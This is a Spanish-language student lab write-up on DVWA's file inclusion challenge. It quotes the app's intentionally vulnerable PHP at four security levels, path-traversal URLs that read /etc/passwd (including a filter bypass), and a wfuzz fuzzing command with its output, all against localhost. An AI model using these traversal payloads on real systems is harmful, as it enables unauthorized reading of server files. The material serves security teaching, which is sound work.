# FI

## Nivel: `bajo`

### source

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?> 
```

### vulnerability check

```
http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

![check1](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/check1.png)

---

Durante la realización del nivel bajo se probo la herramienta `wfuzz` para hacer fuzzing de la URI, pero no se obtuvo ningún resultado extra.
Realmente el uso de la herramienta no nos ayudo a solucionar el reto de este nivel, pero si que nos ayudo a entender como funciona la herramienta y posibles usos de la misma.

```
wfuzz -c --hl 81 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -b "security=low; PHPSESSID=eboalr1aom47l322etbqjebovg" "http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php
Total requests: 81643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000001463:   200        92 L     267 W      3491 Ch     "fi"                                                                                                                                                                       

Total time: 0
Processed Requests: 81643
Filtered Requests: 81642
Requests/sec.: 0
```

## Nivel: `medio`

### source

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?> 
```

### vulnerability check

```
http://localhost/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
```

![check2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/check2.png)

## Nivel: `alto`

### source

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

### vulnerability check

## Nivel: `imposible`

### source

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

### vulnerability check

## Referencias

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HTB Academy](https://academy.hackthebox.com/module/77/section/725)
